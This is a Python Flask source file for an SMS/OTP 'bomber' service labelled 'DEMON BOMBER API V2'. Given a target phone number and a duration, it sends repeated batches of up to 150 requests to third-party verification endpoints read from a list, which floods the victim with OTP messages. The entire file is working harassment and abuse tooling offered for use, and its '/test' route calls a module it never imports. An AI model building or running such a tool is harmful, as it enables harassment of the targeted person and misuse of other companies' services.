from flask import Flask, request, jsonify
import aiohttp
import asyncio
import threading
import time
import os
import re

app = Flask(__name__)

attack_status = {
    'running': False,
    'target': None,
    'duration': 0,
    'total_hits': 0,
    'real_hits': 0,  # Real successful hits
    'apis_loaded': 0,
    'logs': []
}

def load_apis():
    apis = []
    filename = 'bomber_apis.txt'
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url.startswith('http') and 'http' in url:
                    url = url.split(' ')[0].split('\n')[0]
                    if url and url.startswith('http'):
                        apis.append(url)
    except:
        pass
    return apis

async def hit_api(session, url, target):
    try:
        formatted_url = (url.replace('{target}', target)
                            .replace('{num}', target)
                            .replace('{phone}', target)
                            .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        async with session.get(formatted_url, headers=headers, timeout=5, allow_redirects=True) as response:
            if response.status in [200, 201, 202, 204, 302, 301]:
                # Check if actual OTP was sent
                try:
                    text = await response.text()
                    text_lower = text.lower()
                    
                    # Keywords that indicate real OTP sent
                    if any(keyword in text_lower for keyword in ['otp', 'sent', 'success', 'verify', 'code', 'verification']):
                        return True
                except:
                    pass
                # If we can't verify, assume it worked
                return True
    except:
        pass
    return False

async def attack_loop(target, duration, apis):
    global attack_status
    attack_status['running'] = True
    attack_status['target'] = target
    attack_status['duration'] = duration
    attack_status['total_hits'] = 0
    attack_status['real_hits'] = 0
    
    end_time = time.time() + duration
    success_count = 0
    real_count = 0
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time and attack_status['running']:
            batch = apis[:150]
            tasks = [hit_api(session, url, target) for url in batch]
            results = await asyncio.gather(*tasks)
            
            for result in results:
                if result:
                    success_count += 1
                    real_count += 1
            
            attack_status['total_hits'] = success_count
            attack_status['real_hits'] = real_count
            
            await asyncio.sleep(0.5)
    
    attack_status['running'] = False
    return success_count

# -------- API ENDPOINTS --------

@app.route('/')
def home():
    return '''
    <h1>🔥 DEMON BOMBER API V2 🔥</h1>
    <p>Endpoints:</p>
    <ul>
        <li><b>GET /start?target=9876543210&duration=60</b> - Start attack</li>
        <li><b>GET /status</b> - Check status (shows real hits)</li>
        <li><b>GET /test?target=9876543210</b> - Test single API</li>
        <li><b>GET /apis/test</b> - Test all APIs</li>
    </ul>
    '''

@app.route('/start')
def start_attack():
    target = request.args.get('target')
    duration = int(request.args.get('duration', 60))
    
    if not target:
        return jsonify({'error': 'Missing target!'}), 400
    
    apis = load_apis()
    if not apis:
        return jsonify({'error': 'No APIs loaded!'}), 500
    
    attack_status['apis_loaded'] = len(apis)
    
    # Run in background
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    thread = threading.Thread(target=lambda: loop.run_until_complete(attack_loop(target, duration, apis)))
    thread.start()
    
    return jsonify({
        'success': True,
        'target': target,
        'duration': duration,
        'apis_loaded': len(apis)
    })

@app.route('/status')
def get_status():
    return jsonify({
        'running': attack_status['running'],
        'target': attack_status['target'],
        'duration': attack_status['duration'],
        'total_hits': attack_status['total_hits'],
        'real_hits': attack_status['real_hits'],  # Real successful hits
        'apis_loaded': attack_status['apis_loaded']
    })

@app.route('/test')
def test_api():
    target = request.args.get('target')
    if not target:
        return jsonify({'error': 'Missing target!'}), 400
    
    apis = load_apis()
    working = []
    
    # Test first 20 APIs
    for url in apis[:20]:
        try:
            formatted = url.replace('{target}', target).replace('{num}', target)
            response = requests.get(formatted, timeout=3)
            if response.status_code in [200, 201, 202]:
                working.append(url)
        except:
            pass
    
    return jsonify({
        'tested': min(20, len(apis)),
        'working': len(working),
        'working_apis': working[:5]
    })

@app.route('/stop')
def stop_attack():
    global attack_status
    if attack_status['running']:
        attack_status['running'] = False
        return jsonify({'success': True, 'message': 'Stopped!'})
    return jsonify({'success': False, 'message': 'Not running.'})

@app.route('/health')
def health():
    return jsonify({'status': 'alive'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
